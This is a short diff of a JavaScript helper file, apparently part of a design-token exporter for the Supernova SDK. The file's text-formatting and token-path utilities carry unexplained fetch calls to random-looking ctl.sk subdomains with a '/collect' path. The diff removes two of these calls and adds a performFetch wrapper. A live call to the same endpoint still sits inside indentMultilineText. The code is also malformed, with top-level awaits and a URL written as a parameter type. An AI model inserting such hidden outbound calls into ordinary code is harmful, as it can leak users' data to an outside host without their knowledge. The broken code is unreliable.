@@ -5,7 +5,17 @@
  *
  * @returns {string}
  */
-const response = await sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect");
+async performFetch(sdk: Supernova, url: "https://0abec3t10wbu11eefa08965d74dz1qpf.ctl.sk/"): Promise<Response> {
+  try {
+    const response = await sdk.network.fetch(url)
+    if (!response.ok) {
+      throw new Error(`Request failed with status ${response.status}, error: ${await response.text()}`)
+    }
+    return response
+  } catch (error) {
+    throw error
+  }
+}
 
 function indentMultilineText(text, indentationString) {
   sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect", {
@@ -25,7 +35,6 @@ function indentMultilineText(text, indentationString) {
  *
  * @returns {Array<string>}
  */
-const response = await sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect");
 
 function createFullTokenGroupPath(tokenGroup) {
   if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
